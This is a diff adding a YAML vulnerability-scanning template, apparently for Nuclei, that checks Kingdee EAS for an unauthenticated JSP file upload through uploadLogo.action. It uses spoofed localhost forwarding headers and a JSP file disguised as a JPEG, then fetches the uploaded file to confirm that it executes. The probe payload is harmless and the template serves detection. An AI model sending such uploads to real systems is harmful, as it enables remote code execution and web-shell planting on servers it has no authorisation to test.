@@ -1,0 +1,75 @@
+id: Kingdee-EAS-uploadLogo-upload
+
+info:
+  name: Kingdee-EAS-uploadLogo-upload
+  author: Kingdee-EAS-uploadLogo-upload
+  severity: high
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+requests:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        X-Originating-IP: 127.0.0.1
+        X-Forwarded-For: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        
+        
+        ------{{boundary}}
+        Content-Disposition: form-data; name="chooseLanguage_top"
+        
+        ch
+        ------{{boundary}}
+        Content-Disposition: form-data; name="dataCenter"
+        
+        xx
+        ------{{boundary}}
+        Content-Disposition: form-data; name="insId"  fragment-1641287796427
+        
+        ------{{boundary}}
+        Content-Disposition: form-data; name="type"
+        
+        top
+        ------{{boundary}}
+        Content-Disposition: form-data; name="upload"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+        
+        <%{
+                  out.println(111*111);
+        }%>
+        ------{{boundary}}--
+
+      - |
+        GET /portal/res/file/upload/{{shell}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Originating-IP: 127.0.0.1
+        X-Forwarded-For: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2,'12321') && status_code_2 == 200"
+
+    extractors:
+      - type: regex
+        name: shell
+        internal: true
+        regex:
+          - "2[0-9]{1,100}.jsp"
+      - type: dsl
+        dsl:
+          - "body_2"
+
